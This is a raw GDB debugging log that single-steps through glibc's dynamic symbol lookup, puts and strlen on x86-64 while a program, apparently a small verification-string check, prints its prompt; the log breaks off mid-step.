   0x7ffff7de1a70 <_dl_lookup_symbol_x+160>:	testl  $0xfffffffa,0x10(%rbp)
0x00007ffff7de1a63	809	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a6e <_dl_lookup_symbol_x+158>:	je     0x7ffff7de1a7d <_dl_lookup_symbol_x+173>
   0x7ffff7de1a70 <_dl_lookup_symbol_x+160>:	testl  $0xfffffffa,0x10(%rbp)
   0x7ffff7de1a77 <_dl_lookup_symbol_x+167>:	jne    0x7ffff7de2944 <_dl_lookup_symbol_x+3956>
816	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a70 <_dl_lookup_symbol_x+160>:	testl  $0xfffffffa,0x10(%rbp)
   0x7ffff7de1a77 <_dl_lookup_symbol_x+167>:	jne    0x7ffff7de2944 <_dl_lookup_symbol_x+3956>
   0x7ffff7de1a7d <_dl_lookup_symbol_x+173>:	mov    -0xd0(%rbp),%rax
0x00007ffff7de1a70	816	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a77 <_dl_lookup_symbol_x+167>:	jne    0x7ffff7de2944 <_dl_lookup_symbol_x+3956>
   0x7ffff7de1a7d <_dl_lookup_symbol_x+173>:	mov    -0xd0(%rbp),%rax
   0x7ffff7de1a84 <_dl_lookup_symbol_x+180>:	test   %r13,%r13
0x00007ffff7de1a77	816	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a7d <_dl_lookup_symbol_x+173>:	mov    -0xd0(%rbp),%rax
   0x7ffff7de1a84 <_dl_lookup_symbol_x+180>:	test   %r13,%r13
   0x7ffff7de1a87 <_dl_lookup_symbol_x+183>:	mov    (%rax),%r9
823	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a84 <_dl_lookup_symbol_x+180>:	test   %r13,%r13
   0x7ffff7de1a87 <_dl_lookup_symbol_x+183>:	mov    (%rax),%r9
   0x7ffff7de1a8a <_dl_lookup_symbol_x+186>:	jne    0x7ffff7de1cae <_dl_lookup_symbol_x+734>
821	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a87 <_dl_lookup_symbol_x+183>:	mov    (%rax),%r9
   0x7ffff7de1a8a <_dl_lookup_symbol_x+186>:	jne    0x7ffff7de1cae <_dl_lookup_symbol_x+734>
   0x7ffff7de1a90 <_dl_lookup_symbol_x+192>:	test   %r9,%r9
823	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a8a <_dl_lookup_symbol_x+186>:	jne    0x7ffff7de1cae <_dl_lookup_symbol_x+734>
   0x7ffff7de1a90 <_dl_lookup_symbol_x+192>:	test   %r9,%r9
   0x7ffff7de1a93 <_dl_lookup_symbol_x+195>:	movq   $0x0,-0xd8(%rbp)
821	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a90 <_dl_lookup_symbol_x+192>:	test   %r9,%r9
   0x7ffff7de1a93 <_dl_lookup_symbol_x+195>:	movq   $0x0,-0xd8(%rbp)
   0x7ffff7de1a9e <_dl_lookup_symbol_x+206>:	je     0x7ffff7de1cd6 <_dl_lookup_symbol_x+774>
827	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a93 <_dl_lookup_symbol_x+195>:	movq   $0x0,-0xd8(%rbp)
   0x7ffff7de1a9e <_dl_lookup_symbol_x+206>:	je     0x7ffff7de1cd6 <_dl_lookup_symbol_x+774>
   0x7ffff7de1aa4 <_dl_lookup_symbol_x+212>:	lea    -0x90(%rbp),%rcx
820	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1a9e <_dl_lookup_symbol_x+206>:	je     0x7ffff7de1cd6 <_dl_lookup_symbol_x+774>
   0x7ffff7de1aa4 <_dl_lookup_symbol_x+212>:	lea    -0x90(%rbp),%rcx
   0x7ffff7de1aab <_dl_lookup_symbol_x+219>:	mov    -0xd8(%rbp),%rax
827	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1aa4 <_dl_lookup_symbol_x+212>:	lea    -0x90(%rbp),%rcx
   0x7ffff7de1aab <_dl_lookup_symbol_x+219>:	mov    -0xd8(%rbp),%rax
   0x7ffff7de1ab2 <_dl_lookup_symbol_x+226>:	mov    -0xd0(%rbp),%rbx
0x00007ffff7de1aa4	827	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1aab <_dl_lookup_symbol_x+219>:	mov    -0xd8(%rbp),%rax
   0x7ffff7de1ab2 <_dl_lookup_symbol_x+226>:	mov    -0xd0(%rbp),%rbx
   0x7ffff7de1ab9 <_dl_lookup_symbol_x+233>:	mov    %rcx,-0xc8(%rbp)
820	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1ab2 <_dl_lookup_symbol_x+226>:	mov    -0xd0(%rbp),%rbx
   0x7ffff7de1ab9 <_dl_lookup_symbol_x+233>:	mov    %rcx,-0xc8(%rbp)
   0x7ffff7de1ac0 <_dl_lookup_symbol_x+240>:	lea    -0xa0(%rbp),%rcx
0x00007ffff7de1ab2	820	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1ab9 <_dl_lookup_symbol_x+233>:	mov    %rcx,-0xc8(%rbp)
   0x7ffff7de1ac0 <_dl_lookup_symbol_x+240>:	lea    -0xa0(%rbp),%rcx
   0x7ffff7de1ac7 <_dl_lookup_symbol_x+247>:	mov    %rcx,-0xb8(%rbp)
0x00007ffff7de1ab9	820	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1ac0 <_dl_lookup_symbol_x+240>:	lea    -0xa0(%rbp),%rcx
   0x7ffff7de1ac7 <_dl_lookup_symbol_x+247>:	mov    %rcx,-0xb8(%rbp)
   0x7ffff7de1ace <_dl_lookup_symbol_x+254>:	jmp    0x7ffff7de1ae9 <_dl_lookup_symbol_x+281>
0x00007ffff7de1ac0	820	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1ac7 <_dl_lookup_symbol_x+247>:	mov    %rcx,-0xb8(%rbp)
   0x7ffff7de1ace <_dl_lookup_symbol_x+254>:	jmp    0x7ffff7de1ae9 <_dl_lookup_symbol_x+281>
   0x7ffff7de1ad0 <_dl_lookup_symbol_x+256>:	je     0x7ffff7de1adb <_dl_lookup_symbol_x+267>
0x00007ffff7de1ac7	820	in dl-lookup.c
(gdb) 
=> 0x7ffff7de1ace <_dl_lookup_symbol_x+254>:	jmp    0x7ffff7de1ae9 <_dl_lookup_symbol_x+281>
   0x7ffff7de1ad0 <_dl_lookup_symbol_x+256>:	je     0x7ffff7de1adb <_dl_lookup_symbol_x+267>
   0x7ffff7de1ad2 <_dl_lookup_symbol_x+258>:	test   %r13,%r13
0x00007ffff7de1ace	820	in dl-lookup.c
(gdb) disas puts
Dump of assembler code for function _IO_puts:
   0x00007ffff7837690 <+0>:	push   %r12
   0x00007ffff7837692 <+2>:	push   %rbp
   0x00007ffff7837693 <+3>:	mov    %rdi,%r12
   0x00007ffff7837696 <+6>:	push   %rbx
   0x00007ffff7837697 <+7>:	callq  0x7ffff7853720 <strlen>
   0x00007ffff783769c <+12>:	mov    0x356065(%rip),%rbp        # 0x7ffff7b8d708 <stdout>
   0x00007ffff78376a3 <+19>:	mov    %rax,%rbx
   0x00007ffff78376a6 <+22>:	mov    0x0(%rbp),%eax
   0x00007ffff78376a9 <+25>:	mov    %rbp,%rdi
   0x00007ffff78376ac <+28>:	and    $0x8000,%eax
   0x00007ffff78376b1 <+33>:	jne    0x7ffff7837714 <_IO_puts+132>
   0x00007ffff78376b3 <+35>:	mov    0x88(%rbp),%rdx
   0x00007ffff78376ba <+42>:	mov    %fs:0x10,%r8
   0x00007ffff78376c3 <+51>:	cmp    0x8(%rdx),%r8
   0x00007ffff78376c7 <+55>:	je     0x7ffff78377e8 <_IO_puts+344>
   0x00007ffff78376cd <+61>:	mov    $0x1,%esi
   0x00007ffff78376d2 <+66>:	cmpl   $0x0,0x35a067(%rip)        # 0x7ffff7b91740 <__libc_multiple_threads>
   0x00007ffff78376d9 <+73>:	je     0x7ffff78376e3 <_IO_puts+83>
   0x00007ffff78376db <+75>:	lock cmpxchg %esi,(%rdx)
   0x00007ffff78376df <+79>:	jne    0x7ffff78376e8 <_IO_puts+88>
   0x00007ffff78376e1 <+81>:	jmp    0x7ffff78376fe <_IO_puts+110>
   0x00007ffff78376e3 <+83>:	cmpxchg %esi,(%rdx)
   0x00007ffff78376e6 <+86>:	je     0x7ffff78376fe <_IO_puts+110>
   0x00007ffff78376e8 <+88>:	lea    (%rdx),%rdi
   0x00007ffff78376eb <+91>:	sub    $0x80,%rsp
   0x00007ffff78376f2 <+98>:	callq  0x7ffff78dd080 <__lll_lock_wait_private>
   0x00007ffff78376f7 <+103>:	add    $0x80,%rsp
   0x00007ffff78376fe <+110>:	mov    0x88(%rbp),%rdx
   0x00007ffff7837705 <+117>:	mov    0x355ffc(%rip),%rdi        # 0x7ffff7b8d708 <stdout>
   0x00007ffff783770c <+124>:	mov    %r8,0x8(%rdx)
   0x00007ffff7837710 <+128>:	addl   $0x1,0x4(%rdx)
   0x00007ffff7837714 <+132>:	mov    0xc0(%rdi),%eax
   0x00007ffff783771a <+138>:	test   %eax,%eax
   0x00007ffff783771c <+140>:	jne    0x7ffff7837788 <_IO_puts+248>
   0x00007ffff783771e <+142>:	movl   $0xffffffff,0xc0(%rdi)
   0x00007ffff7837728 <+152>:	mov    0xd8(%rdi),%rax
   0x00007ffff783772f <+159>:	mov    %rbx,%rdx
   0x00007ffff7837732 <+162>:	mov    %r12,%rsi
   0x00007ffff7837735 <+165>:	callq  *0x38(%rax)
   0x00007ffff7837738 <+168>:	cmp    %rax,%rbx
   0x00007ffff783773b <+171>:	jne    0x7ffff783778d <_IO_puts+253>
   0x00007ffff783773d <+173>:	mov    0x355fc4(%rip),%rdi        # 0x7ffff7b8d708 <stdout>
   0x00007ffff7837744 <+180>:	mov    0x28(%rdi),%rax
   0x00007ffff7837748 <+184>:	cmp    0x30(%rdi),%rax
   0x00007ffff783774c <+188>:	jae    0x7ffff78377f0 <_IO_puts+352>
   0x00007ffff7837752 <+194>:	lea    0x1(%rax),%rdx
---Type <return> to continue, or q <return> to quit---
   0x00007ffff7837756 <+198>:	mov    %rdx,0x28(%rdi)
   0x00007ffff783775a <+202>:	movb   $0xa,(%rax)
   0x00007ffff783775d <+205>:	add    $0x1,%rbx
   0x00007ffff7837761 <+209>:	mov    $0x7fffffff,%eax
   0x00007ffff7837766 <+214>:	cmp    $0x7fffffff,%rbx
   0x00007ffff783776d <+221>:	cmova  %rax,%rbx
   0x00007ffff7837771 <+225>:	testl  $0x8000,0x0(%rbp)
   0x00007ffff7837778 <+232>:	je     0x7ffff783779b <_IO_puts+267>
   0x00007ffff783777a <+234>:	mov    %ebx,%eax
   0x00007ffff783777c <+236>:	pop    %rbx
   0x00007ffff783777d <+237>:	pop    %rbp
   0x00007ffff783777e <+238>:	pop    %r12
   0x00007ffff7837780 <+240>:	retq   
   0x00007ffff7837781 <+241>:	nopl   0x0(%rax)
   0x00007ffff7837788 <+248>:	cmp    $0xffffffff,%eax
   0x00007ffff783778b <+251>:	je     0x7ffff7837728 <_IO_puts+152>
   0x00007ffff783778d <+253>:	testl  $0x8000,0x0(%rbp)
   0x00007ffff7837794 <+260>:	mov    $0xffffffff,%ebx
   0x00007ffff7837799 <+265>:	jne    0x7ffff783777a <_IO_puts+234>
   0x00007ffff783779b <+267>:	mov    0x88(%rbp),%rdx
   0x00007ffff78377a2 <+274>:	subl   $0x1,0x4(%rdx)
   0x00007ffff78377a6 <+278>:	jne    0x7ffff783777a <_IO_puts+234>
   0x00007ffff78377a8 <+280>:	movq   $0x0,0x8(%rdx)
   0x00007ffff78377b0 <+288>:	cmpl   $0x0,0x359f89(%rip)        # 0x7ffff7b91740 <__libc_multiple_threads>
   0x00007ffff78377b7 <+295>:	je     0x7ffff78377c0 <_IO_puts+304>
   0x00007ffff78377b9 <+297>:	lock decl (%rdx)
   0x00007ffff78377bc <+300>:	jne    0x7ffff78377c4 <_IO_puts+308>
   0x00007ffff78377be <+302>:	jmp    0x7ffff78377da <_IO_puts+330>
   0x00007ffff78377c0 <+304>:	decl   (%rdx)
   0x00007ffff78377c2 <+306>:	je     0x7ffff78377da <_IO_puts+330>
   0x00007ffff78377c4 <+308>:	lea    (%rdx),%rdi
   0x00007ffff78377c7 <+311>:	sub    $0x80,%rsp
   0x00007ffff78377ce <+318>:	callq  0x7ffff78dd0b0 <__lll_unlock_wake_private>
   0x00007ffff78377d3 <+323>:	add    $0x80,%rsp
   0x00007ffff78377da <+330>:	mov    %ebx,%eax
   0x00007ffff78377dc <+332>:	pop    %rbx
   0x00007ffff78377dd <+333>:	pop    %rbp
   0x00007ffff78377de <+334>:	pop    %r12
   0x00007ffff78377e0 <+336>:	retq   
   0x00007ffff78377e1 <+337>:	nopl   0x0(%rax)
   0x00007ffff78377e8 <+344>:	mov    %rbp,%rdi
   0x00007ffff78377eb <+347>:	jmpq   0x7ffff7837710 <_IO_puts+128>
   0x00007ffff78377f0 <+352>:	mov    $0xa,%esi
   0x00007ffff78377f5 <+357>:	callq  0x7ffff7843220 <__GI___overflow>
   0x00007ffff78377fa <+362>:	cmp    $0xffffffff,%eax
   0x00007ffff78377fd <+365>:	jne    0x7ffff783775d <_IO_puts+205>
   0x00007ffff7837803 <+371>:	jmp    0x7ffff783778d <_IO_puts+253>
---Type <return> to continue, or q <return> to quit---
   0x00007ffff7837805 <+373>:	mov    %rax,%rsi
   0x00007ffff7837808 <+376>:	testl  $0x8000,0x0(%rbp)
   0x00007ffff783780f <+383>:	jne    0x7ffff7837850 <_IO_puts+448>
   0x00007ffff7837811 <+385>:	mov    0x88(%rbp),%rdx
   0x00007ffff7837818 <+392>:	subl   $0x1,0x4(%rdx)
   0x00007ffff783781c <+396>:	jne    0x7ffff7837850 <_IO_puts+448>
   0x00007ffff783781e <+398>:	movq   $0x0,0x8(%rdx)
   0x00007ffff7837826 <+406>:	cmpl   $0x0,0x359f13(%rip)        # 0x7ffff7b91740 <__libc_multiple_threads>
   0x00007ffff783782d <+413>:	je     0x7ffff7837836 <_IO_puts+422>
   0x00007ffff783782f <+415>:	lock decl (%rdx)
   0x00007ffff7837832 <+418>:	jne    0x7ffff783783a <_IO_puts+426>
   0x00007ffff7837834 <+420>:	jmp    0x7ffff7837850 <_IO_puts+448>
   0x00007ffff7837836 <+422>:	decl   (%rdx)
   0x00007ffff7837838 <+424>:	je     0x7ffff7837850 <_IO_puts+448>
   0x00007ffff783783a <+426>:	lea    (%rdx),%rdi
   0x00007ffff783783d <+429>:	sub    $0x80,%rsp
   0x00007ffff7837844 <+436>:	callq  0x7ffff78dd0b0 <__lll_unlock_wake_private>
   0x00007ffff7837849 <+441>:	add    $0x80,%rsp
   0x00007ffff7837850 <+448>:	mov    %rsi,%rdi
   0x00007ffff7837853 <+451>:	callq  0x7ffff77e8b30 <_Unwind_Resume>
End of assembler dump.
(gdb) b puts
Breakpoint 5 at 0x7ffff7837690: file ioputs.c, line 33.
(gdb) c
Continuing.
=> 0x7ffff7837690 <_IO_puts>:	push   %r12
   0x7ffff7837692 <_IO_puts+2>:	push   %rbp
   0x7ffff7837693 <_IO_puts+3>:	mov    %rdi,%r12

Breakpoint 5, _IO_puts (str=0x400b0b "Enter verification string?") at ioputs.c:33
33	ioputs.c: No such file or directory.
(gdb) si
=> 0x7ffff7837692 <_IO_puts+2>:	push   %rbp
   0x7ffff7837693 <_IO_puts+3>:	mov    %rdi,%r12
   0x7ffff7837696 <_IO_puts+6>:	push   %rbx
0x00007ffff7837692	33	in ioputs.c
(gdb) 
=> 0x7ffff7837693 <_IO_puts+3>:	mov    %rdi,%r12
   0x7ffff7837696 <_IO_puts+6>:	push   %rbx
   0x7ffff7837697 <_IO_puts+7>:	callq  0x7ffff7853720 <strlen>
0x00007ffff7837693	33	in ioputs.c
(gdb) 
=> 0x7ffff7837696 <_IO_puts+6>:	push   %rbx
   0x7ffff7837697 <_IO_puts+7>:	callq  0x7ffff7853720 <strlen>
   0x7ffff783769c <_IO_puts+12>:	mov    0x356065(%rip),%rbp        # 0x7ffff7b8d708 <stdout>
0x00007ffff7837696	33	in ioputs.c
(gdb) 
=> 0x7ffff7837697 <_IO_puts+7>:	callq  0x7ffff7853720 <strlen>
   0x7ffff783769c <_IO_puts+12>:	mov    0x356065(%rip),%rbp        # 0x7ffff7b8d708 <stdout>
   0x7ffff78376a3 <_IO_puts+19>:	mov    %rax,%rbx
35	in ioputs.c
(gdb) 
=> 0x7ffff7853720 <strlen>:	pxor   %xmm0,%xmm0
   0x7ffff7853724 <strlen+4>:	pxor   %xmm1,%xmm1
   0x7ffff7853728 <strlen+8>:	pxor   %xmm2,%xmm2
strlen () at ../sysdeps/x86_64/strlen.S:66
66	../sysdeps/x86_64/strlen.S: No such file or directory.
(gdb) 
=> 0x7ffff7853724 <strlen+4>:	pxor   %xmm1,%xmm1
   0x7ffff7853728 <strlen+8>:	pxor   %xmm2,%xmm2
   0x7ffff785372c <strlen+12>:	pxor   %xmm3,%xmm3
67	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853728 <strlen+8>:	pxor   %xmm2,%xmm2
   0x7ffff785372c <strlen+12>:	pxor   %xmm3,%xmm3
   0x7ffff7853730 <strlen+16>:	mov    %rdi,%rax
68	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785372c <strlen+12>:	pxor   %xmm3,%xmm3
   0x7ffff7853730 <strlen+16>:	mov    %rdi,%rax
   0x7ffff7853733 <strlen+19>:	mov    %rdi,%rcx
69	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853730 <strlen+16>:	mov    %rdi,%rax
   0x7ffff7853733 <strlen+19>:	mov    %rdi,%rcx
   0x7ffff7853736 <strlen+22>:	and    $0xfff,%rcx
70	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853733 <strlen+19>:	mov    %rdi,%rcx
   0x7ffff7853736 <strlen+22>:	and    $0xfff,%rcx
   0x7ffff785373d <strlen+29>:	cmp    $0xfcf,%rcx
71	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853736 <strlen+22>:	and    $0xfff,%rcx
   0x7ffff785373d <strlen+29>:	cmp    $0xfcf,%rcx
   0x7ffff7853744 <strlen+36>:	ja     0x7ffff78537b0 <strlen+144>
72	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785373d <strlen+29>:	cmp    $0xfcf,%rcx
   0x7ffff7853744 <strlen+36>:	ja     0x7ffff78537b0 <strlen+144>
   0x7ffff7853746 <strlen+38>:	movdqu (%rax),%xmm4
74	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853744 <strlen+36>:	ja     0x7ffff78537b0 <strlen+144>
   0x7ffff7853746 <strlen+38>:	movdqu (%rax),%xmm4
   0x7ffff785374a <strlen+42>:	pcmpeqb %xmm0,%xmm4
76	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853746 <strlen+38>:	movdqu (%rax),%xmm4
   0x7ffff785374a <strlen+42>:	pcmpeqb %xmm0,%xmm4
   0x7ffff785374e <strlen+46>:	pmovmskb %xmm4,%edx
106	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785374a <strlen+42>:	pcmpeqb %xmm0,%xmm4
   0x7ffff785374e <strlen+46>:	pmovmskb %xmm4,%edx
   0x7ffff7853752 <strlen+50>:	test   %edx,%edx
107	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785374e <strlen+46>:	pmovmskb %xmm4,%edx
   0x7ffff7853752 <strlen+50>:	test   %edx,%edx
   0x7ffff7853754 <strlen+52>:	je     0x7ffff785375a <strlen+58>
108	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853752 <strlen+50>:	test   %edx,%edx
   0x7ffff7853754 <strlen+52>:	je     0x7ffff785375a <strlen+58>
   0x7ffff7853756 <strlen+54>:	bsf    %edx,%eax
109	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853754 <strlen+52>:	je     0x7ffff785375a <strlen+58>
   0x7ffff7853756 <strlen+54>:	bsf    %edx,%eax
   0x7ffff7853759 <strlen+57>:	retq   
110	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785375a <strlen+58>:	and    $0xfffffffffffffff0,%rax
   0x7ffff785375e <strlen+62>:	pcmpeqb 0x10(%rax),%xmm1
   0x7ffff7853763 <strlen+67>:	pcmpeqb 0x20(%rax),%xmm2
116	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785375e <strlen+62>:	pcmpeqb 0x10(%rax),%xmm1
   0x7ffff7853763 <strlen+67>:	pcmpeqb 0x20(%rax),%xmm2
   0x7ffff7853768 <strlen+72>:	pcmpeqb 0x30(%rax),%xmm3
117	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853763 <strlen+67>:	pcmpeqb 0x20(%rax),%xmm2
   0x7ffff7853768 <strlen+72>:	pcmpeqb 0x30(%rax),%xmm3
   0x7ffff785376d <strlen+77>:	pmovmskb %xmm1,%edx
118	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853768 <strlen+72>:	pcmpeqb 0x30(%rax),%xmm3
   0x7ffff785376d <strlen+77>:	pmovmskb %xmm1,%edx
   0x7ffff7853771 <strlen+81>:	pmovmskb %xmm2,%r8d
119	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785376d <strlen+77>:	pmovmskb %xmm1,%edx
   0x7ffff7853771 <strlen+81>:	pmovmskb %xmm2,%r8d
   0x7ffff7853776 <strlen+86>:	pmovmskb %xmm3,%ecx
120	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853771 <strlen+81>:	pmovmskb %xmm2,%r8d
   0x7ffff7853776 <strlen+86>:	pmovmskb %xmm3,%ecx
   0x7ffff785377a <strlen+90>:	shl    $0x10,%rdx
121	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853776 <strlen+86>:	pmovmskb %xmm3,%ecx
   0x7ffff785377a <strlen+90>:	shl    $0x10,%rdx
   0x7ffff785377e <strlen+94>:	shl    $0x10,%rcx
122	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785377a <strlen+90>:	shl    $0x10,%rdx
   0x7ffff785377e <strlen+94>:	shl    $0x10,%rcx
   0x7ffff7853782 <strlen+98>:	or     %r8,%rcx
123	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785377e <strlen+94>:	shl    $0x10,%rcx
   0x7ffff7853782 <strlen+98>:	or     %r8,%rcx
   0x7ffff7853785 <strlen+101>:	shl    $0x20,%rcx
124	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853782 <strlen+98>:	or     %r8,%rcx
   0x7ffff7853785 <strlen+101>:	shl    $0x20,%rcx
   0x7ffff7853789 <strlen+105>:	or     %rcx,%rdx
125	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853785 <strlen+101>:	shl    $0x20,%rcx
   0x7ffff7853789 <strlen+105>:	or     %rcx,%rdx
   0x7ffff785378c <strlen+108>:	mov    %rdi,%rcx
126	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853789 <strlen+105>:	or     %rcx,%rdx
   0x7ffff785378c <strlen+108>:	mov    %rdi,%rcx
   0x7ffff785378f <strlen+111>:	xor    %rax,%rcx
127	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785378c <strlen+108>:	mov    %rdi,%rcx
   0x7ffff785378f <strlen+111>:	xor    %rax,%rcx
   0x7ffff7853792 <strlen+114>:	and    $0xffffffffffffffc0,%rax
132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785378f <strlen+111>:	xor    %rax,%rcx
   0x7ffff7853792 <strlen+114>:	and    $0xffffffffffffffc0,%rax
   0x7ffff7853796 <strlen+118>:	sar    %cl,%rdx
0x00007ffff785378f	132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853792 <strlen+114>:	and    $0xffffffffffffffc0,%rax
   0x7ffff7853796 <strlen+118>:	sar    %cl,%rdx
   0x7ffff7853799 <strlen+121>:	test   %rdx,%rdx
0x00007ffff7853792	132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853796 <strlen+118>:	sar    %cl,%rdx
   0x7ffff7853799 <strlen+121>:	test   %rdx,%rdx
   0x7ffff785379c <strlen+124>:	je     0x7ffff7853820 <strlen+256>
0x00007ffff7853796	132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff7853799 <strlen+121>:	test   %rdx,%rdx
   0x7ffff785379c <strlen+124>:	je     0x7ffff7853820 <strlen+256>
   0x7ffff78537a2 <strlen+130>:	bsf    %rdx,%rax
0x00007ffff7853799	132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff785379c <strlen+124>:	je     0x7ffff7853820 <strlen+256>
   0x7ffff78537a2 <strlen+130>:	bsf    %rdx,%rax
   0x7ffff78537a6 <strlen+134>:	retq   
0x00007ffff785379c	132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff78537a2 <strlen+130>:	bsf    %rdx,%rax
   0x7ffff78537a6 <strlen+134>:	retq   
   0x7ffff78537a7 <strlen+135>:	nopw   0x0(%rax,%rax,1)
0x00007ffff78537a2	132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff78537a6 <strlen+134>:	retq   
   0x7ffff78537a7 <strlen+135>:	nopw   0x0(%rax,%rax,1)
   0x7ffff78537b0 <strlen+144>:	and    $0xffffffffffffffc0,%rax
0x00007ffff78537a6 in strlen () at ../sysdeps/x86_64/strlen.S:132
132	in ../sysdeps/x86_64/strlen.S
(gdb) 
=> 0x7ffff783769c <_IO_puts+12>:	mov    0x356065(%rip),%rbp        # 0x7ffff7b8d708 <stdout>
   0x7ffff78376a3 <_IO_puts+19>:	mov    %rax,%rbx
   0x7ffff78376a6 <_IO_puts+22>:	mov    0x0(%rbp),%eax
_IO_puts (str=0x400b0b "Enter verification string?") at ioputs.c:36
36	ioputs.c: No such file or directory.
(gdb) 
=> 0x7ffff78376a3 <_IO_puts+19>:	mov    %rax,%rbx
   0x7ffff78376a6 <_IO_puts+22>:	mov    0x0(%rbp),%eax
   0x7ffff78376a9 <_IO_puts+25>:	mov    %rbp,%rdi
35	in ioputs.c
(gdb) 
=> 0x7ffff78376a6 <_IO_puts+22>:	mov    0x0(%rbp),%eax
   0x7ffff78376a9 <_IO_puts+25>:	mov    %rbp,%rdi
   0x7ffff78376ac <_IO_puts+28>:	and    $0x8000,%eax
36	in ioputs.c
(gdb) 
=> 0x7ffff78376a9 <_IO_puts+25>:	mov    %rbp,%rdi
   0x7ffff78376ac <_IO_puts+28>:	and    $0x8000,%eax
   0x7ffff78376b1 <_IO_puts+33>:	jne    0x7ffff7837714 <_IO_puts+132>
0x00007ffff78376a9	36	in ioputs.c
(gdb) 
=> 0x7ffff78376ac <_IO_puts+28>:	and    $0x8000,%eax
   0x7ffff78376b1 <_IO_puts+33>:	jne    0x7ffff7837714 <_IO_puts+132>
   0x7ffff78376b3 <_IO_puts+35>:	mov    0x88(%rbp),%rdx
0x00007ffff78376ac	36	in ioputs.c
(gdb) 
=> 0x7ffff78376b1 <_IO_puts+33>:	jne    0x7ffff7837714 <_IO_puts+132>
   0x7ffff78376b3 <_IO_puts+35>:	mov    0x88(%rbp),%rdx
   0x7ffff78376ba <_IO_puts+42>:	mov    %fs:0x10,%r8
0x00007ffff78376b1	36	in ioputs.c
(gdb) 
=> 0x7ffff78376b3 <_IO_puts+35>:	mov    0x88(%rbp),%rdx
   0x7ffff78376ba <_IO_puts+42>:	mov    %fs:0x10,%r8
   0x7ffff78376c3 <_IO_puts+51>:	cmp    0x8(%rdx),%r8
0x00007ffff78376b3	36	in ioputs.c
(gdb) 
=> 0x7ffff78376ba <_IO_puts+42>:	mov    %fs:0x10,%r8
   0x7ffff78376c3 <_IO_puts+51>:	cmp    0x8(%rdx),%r8
   0x7ffff78376c7 <_IO_puts+55>:	je     0x7ffff78377e8 <_IO_puts+344>
0x00007ffff78376ba	36	in ioputs.c
(gdb) 
=> 0x7ffff78376c3 <_IO_puts+51>:	cmp    0x8(%rdx),%r8
   0x7ffff78376c7 <_IO_puts+55>:	je     0x7ffff78377e8 <_IO_puts+344>
   0x7ffff78376cd <_IO_puts+61>:	mov    $0x1,%esi
0x00007ffff78376c3	36	in ioputs.c
(gdb) 
=> 0x7ffff78376c7 <_IO_puts+55>:	je     0x7ffff78377e8 <_IO_puts+344>
   0x7ffff78376cd <_IO_puts+61>:	mov    $0x1,%esi
   0x7ffff78376d2 <_IO_puts+66>:	cmpl   $0x0,0x35a067(%rip)        # 0x7ffff7b91740 <__libc_multiple_threads>
0x00007ffff78376c7	36	in ioputs.c
(gdb) 
=> 0x7ffff78376cd <_IO_puts+61>:	mov    $0x1,%esi
   0x7ffff78376d2 <_IO_puts+66>:	cmpl   $0x0,0x35a067(%rip)        # 0x7ffff7b91740 <__libc_multiple_threads>
   0x7ffff78376d9 <_IO_puts+73>:	je     0x7ffff78376e3 <_IO_puts+83>
0x00007ffff78376cd	36	in ioputs.c
(gdb) 
=> 0x7ffff78376d2 <_IO_puts+66>:	cmpl   $0x0,0x35a067(%rip)        # 0x7ffff7b91740 <__libc_multiple_threads>
   0x7ffff78376d9 <_IO_puts+73>:	je     0x7ffff78376e3 <_IO_puts+83>
   0x7ffff78376db <_IO_puts+75>:	lock cmpxchg %esi,(%rdx)
0x00007ffff78376d2	36	in ioputs.c
(gdb) 
=> 0x7ffff78376d9 <_IO_puts+73>:	je     0x7ffff78376e3 <_IO_puts+83>
